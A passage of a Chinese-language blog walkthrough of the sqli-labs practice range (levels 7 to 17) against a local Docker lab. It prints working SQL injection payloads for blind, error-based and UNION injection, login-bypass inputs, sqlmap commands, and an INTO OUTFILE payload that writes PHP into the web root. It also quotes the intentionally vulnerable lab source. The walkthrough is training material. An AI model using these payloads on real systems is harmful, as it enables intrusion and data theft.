  <span class="token comment">//print_r(mysql_error());</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注还是常规思路，这里实际上和前面的是一样的，就再啰嗦一下，使用 sqlmap 直接验证看看：</p>
<p><strong>布尔盲注</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sqlmap 的 Payload 如下：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND 3542&#x3D;3542 AND (&#39;rmsD&#39;&#x3D;&#39;rmsD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>延时盲注</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sqlmap 的 Payload 如下：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&#39;QUpy&#39;&#x3D;&#39;QUpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="导出数据到文件"><a href="#导出数据到文件" class="headerlink" title="导出数据到文件"></a>导出数据到文件</h3><p>因为这一关作者很明显地提示了如下信息：</p>
<pre class="line-numbers language-none"><code class="language-none">You are in.... Use outfile......<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>默认 outfile 是没有开启的，得手动开启一下，这个 Docker 靶机理论上应该是开启的，进入容器验证一下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># mysql -e "show global variables like '%secure%';"</span>
+------------------+-------+
<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>
+------------------+-------+
<span class="token operator">|</span> secure_auth      <span class="token operator">|</span> OFF   <span class="token operator">|</span>
<span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>
+------------------+-------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>ure_file_priv 的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li>
<li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li>
<li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li>
</ul>
<p>下面开始直接将数据库里面的信息导出到文件中吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为导出没有指定路径，所以 Linux 下 MySQL 默认导出的路径为：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/var/lib/mysql/security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看下是否将数据库信息导出到文件中了：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /var/lib/mysql/security/users.txt
<span class="token number">1</span>    Dumb    Dumb
<span class="token number">2</span>    Angelina    I-kill-you
<span class="token number">3</span>    Dummy    p@ssword
<span class="token number">4</span>    secure    crappy
<span class="token number">5</span>    stupid    stupidity
<span class="token number">6</span>    superman    genious
<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le
<span class="token number">8</span>    admin    admin
<span class="token number">9</span>    admin1    admin1
<span class="token number">10</span>    admin2    admin2
<span class="token number">11</span>    admin3    admin3
<span class="token number">12</span>    dhakkan    dumbo
<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。</p>
<p>所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-7&#x2F;users.txt&quot;--+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里因为这个 Docker 靶场环境没有配置好权限问题，我们通过 MySQL 直接往 Web 目录下写文件会是失败的，提示如下信息：</p>
<pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">syntaxCan't create<span class="token operator">/</span>write to file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个时候为了演示这个效果，这里只能进容器来手动把权限给开一下了：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> -R <span class="token number">777</span> /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后再执行上面的语句应该是可以成功的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8888/Less-7/users.txt
<span class="token number">1</span>    Dumb    Dumb
<span class="token number">2</span>    Angelina    I-kill-you
<span class="token number">3</span>    Dummy    p@ssword
<span class="token number">4</span>    secure    crappy
<span class="token number">5</span>    stupid    stupidity
<span class="token number">6</span>    superman    genious
<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le
<span class="token number">8</span>    admin    admin
<span class="token number">9</span>    admin1    admin1
<span class="token number">10</span>    admin2    admin2
<span class="token number">11</span>    admin3    admin3
<span class="token number">12</span>    dhakkan    dumbo
<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/Less-7/info.php"</span><span class="token comment">--+ </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问对应的 URL 看看是否解析了呢：</p>
<p><img src="https://image.3001.net/images/20200513/15893696834265.png" alt="img"></p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-7 注入方式一致，只是拼接方式不一样，这里 就不再啰嗦了。</p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-7 注入方式一致，只是拼接方式不一样，这里 就不再啰嗦了。</p>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 使用单引号拼接</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 支持延时盲注</span>
<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入。延时注入细节可以参考 Less-1 的注入细节。</p>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">延时盲注</td>
<td align="left"><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody></table>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先使用双引号再直接拼接</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 支持延时盲注</span>
<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p>
<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=&#39;x&#39;</code></td>
</tr>
</tbody></table>
<p><strong>源码简单分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># POST 方式接受变量</span>
<span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 使用单引号拼接 SQL</span>
@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    输出查询的信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p>
<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span>
+----+----------+----------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
+----+----------+----------+
<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> admin    <span class="token operator">|</span>
+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注释掉 passwd 来登录</span>
<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">'--+&amp;passwd=&amp;submit=Submit
uname=admin'</span><span class="token comment">#&amp;passwd=&amp;submit=Submit</span>

<span class="token comment"># 注释后面语句 并 添加一个永真条件</span>
<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1--+&amp;submit=Submit
uname=admin&amp;passwd=1'</span><span class="token operator">||</span><span class="token number">1</span>--+<span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit
<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1#&amp;submit=Submit
uname=admin&amp;passwd=1'</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#&amp;submit=Submit</span>

<span class="token comment"># 闭合后面语句 并 添加一个永真条件</span>
<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit
<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">'||'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为这是一个 POST 型的注入，那么 这里就再啰嗦一遍，走一遍详细的流程吧</p>
<h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><blockquote>
<p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p>
</blockquote>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&amp;passwd&#x3D;1&#39;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="报错注入1-1"><a href="#报错注入1-1" class="headerlink" title="报错注入1"></a>报错注入1</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<pre class="line-numbers language-paylaod" data-language="paylaod"><code class="language-paylaod">uname&#x3D;admin&amp;passwd&#x3D;1&#39;AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="报错注入2-1"><a href="#报错注入2-1" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<pre class="line-numbers language-paylaod" data-language="paylaod"><code class="language-paylaod">uname&#x3D;admin&amp;passwd&#x3D;1&#39; AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(username AS CHAR),0x27,0x7e) FROM users LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1&#x3D;1#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第一个字母为 <code>s</code></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and left(database(),1)&gt;&#39;r&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submit
uname&#x3D;admin&#39; and left(database(),1)&gt;&#39;s&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd&#x3D;&amp;submit&#x3D;Submit
uname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd&#x3D;&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>加载目标</strong></p>
<p>可以直接将 Burpsuite 截取的数据包内容保持为文本格式 <code>test.txt</code>：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-11/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:8888/Less-11/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>

uname=admin&amp;passwd=2333&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后直接使用 sqlmap 的 -r 参数来加载这个请求包：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以手动通过 <code>--data</code> 来对 POST 的数据包内容进行注入检测：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>实际上 <code>--data</code> 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来我都使用 <code>--data</code> 这个参数来进行注入 🤓</p>
<p><strong>联合查询注入</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>报错注入</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>布尔盲注</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>延时盲注</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=(&quot;x&quot;)</code></td>
</tr>
</tbody></table>
<p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p>
<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=(&#39;x&#39;)</code></td>
</tr>
</tbody></table>
<p>**简单源码分析</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># POST 方式接受变量</span>
<span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 使用单引号和括号来拼接 SQL</span>
@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$uname</span></span>') and password=('<span class="token interpolation"><span class="token variable">$passwd</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
    并没有输出啥信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p>
<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=&quot;x&quot;</code></td>
</tr>
</tbody></table>
<p>**简单源码分析</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先使用 双引号 再直接带入 SQL 语句</span>
<span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> 
@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=<span class="token interpolation"><span class="token variable">$uname</span></span> and password=<span class="token interpolation"><span class="token variable">$passwd</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p>
<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>username=&#39;x&#39;</code></td>
</tr>
</tbody></table>
<p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p>
<p> 这里不再做重复无意义的记录了。</p>
<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>username=(&quot;x&quot;)</code></td>
</tr>
</tbody></table>
<p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>password = &#39;$passwd&#39;</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># uname 参数被过滤了</span>
<span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
